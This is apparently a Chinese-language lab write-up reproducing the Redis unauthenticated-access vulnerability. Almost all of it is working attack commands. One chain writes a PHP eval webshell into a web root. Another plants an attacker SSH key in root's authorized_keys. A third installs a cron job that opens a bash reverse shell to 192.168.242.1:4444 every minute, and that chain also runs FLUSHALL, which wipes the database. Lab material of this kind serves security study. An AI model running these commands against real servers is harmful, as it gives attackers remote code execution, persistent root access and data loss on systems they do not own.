若redis服务暴露在公网，并且没有设置登录口令，则存在未授权访问的风险。攻击者不但可以读取redis保存的数据，还可以利用redis自身的功能，将恶意指令写入文件系统，从而控制服务器。

三、漏洞复现

（一）漏洞形成原因

若redis服务暴露在公网，并且没有设置登录口令，则存在未授权访问的风险。攻击者不但可以读取redis保存的数据，还可以利用redis自身的功能，将恶意指令写入文件系统，从而控制服务器。

（二）漏洞复现过程

1、 利用redis服务的备份功能写入webshell

攻击者从kali连接windows 2012系统的redis服务
redis-cli -h 192.168.242.102
info
连接正常。
//查看工作目录
config get dir
//查看备份文件名称
config get dbfilename
默认情况下，工作目录为redis服务程序的二进制文件所在目录，备份文件名称为dump.rdb。
//指定工作目录
config set dir C:\phpStudy\PHPTutorial\WWW
//指定备份文件名称
config set dbfilename redis.php
//创建键值对，值为php一句话木马
set webshell "<?php @eval($_POST['chopper']);?> "
//保存
save

2、 利用redis服务的备份功能写入ssh公钥信息

首先攻击者在kali系统中生成密钥对
ssh-keygen -t rsa
//将公钥信息加工后写入txt文件，便于传送
echo -e "\n";cat /home/user1/.ssh/id_rsa.pub;echo -e "\n")>key.txt
 
//使用redis客户端程序将公钥信息作为键值写入CentOS 7系统中的redis数据库
cat key.txt | redis-cli -h 192.168.242.101 -x set pub

//redis客户端连接redis服务
redis-cli -h 192.168.242.101
//查看写入的公钥信息
get pub
config set dir /root/.ssh
config set dbfilename authorized_keys
save

在靶机上查看写入的文件内容，正是攻击者的公钥
 
//攻击者远程登录靶机
ssh root@192.168.242.101
通过证书直接登录，无需验证口令。
 

3、 利用redis服务的备份功能写入crontab定时任务

//kali系统中使用netcat监听本地端口
nc -l -p 4444
 
//redis客户端执行下面的指令
//为实验效果，先清除数据库的内容
flushall
//每分钟执行一次反弹连接
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.242.1/4444 0>&1\n\n"
config set dir /var/spool/cron
config set dbfilename root
save
